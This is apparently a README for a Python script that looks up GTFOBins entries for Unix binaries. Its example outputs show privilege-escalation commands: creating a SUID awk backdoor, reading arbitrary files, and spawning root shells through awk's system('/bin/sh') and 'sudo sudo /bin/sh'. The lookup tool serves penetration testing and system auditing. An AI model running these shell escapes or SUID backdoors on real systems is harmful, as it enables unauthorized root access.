# GTFOBins

Execution Instructions
To search for information about a specific binary, such as awk, and filter by the SUID section, run:

```c
python3 GTFOBins.py -b awk -s SUID
```
```c
❯ python3 GTFOBins.py -b awk -s suid
Information for binary 'awk' from GTFOBins:
============================================================

SUID
----
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
sudo install -m =xs $(which awk) .

LFILE=file_to_read
./awk '//' "$LFILE"
--------------------------------------------------------------------------

Limited SUID
------------
If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
sudo install -m =xs $(which awk) .

./awk 'BEGIN {system("/bin/sh")}'
---------------------------------------------------------------------
```

To search without filtering by a specific section, simply omit the -s argument:

```c
python3 GTFOBins.py -b sudo
```

```c
❯ python3 GTFOBins.py -b sudo
Information for binary 'sudo' from GTFOBins:
============================================================

Sudo
----
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
sudo sudo /bin/sh
-----------------
```

To see the help for the script, you can use:

```c
python3 GTFOBins.py -h
```

```c
❯ python3 GTFOBins.py -h
usage: GTFOBins.py [-h] -b BINARY [-s SECTION]

Fetch and display GTFOBins information for a given binary.

options:
  -h, --help            show this help message and exit
  -b BINARY, --binary BINARY
                        Name of the binary to search for on GTFOBins.
  -s SECTION, --section SECTION
                        Specific section to filter the output (e.g., SUID, Sudo).

Example: python3 GTFOBins.py -b awk -s SUID

```

This will display a description of the script, how to use the -b and -s arguments, and provide an example of usage.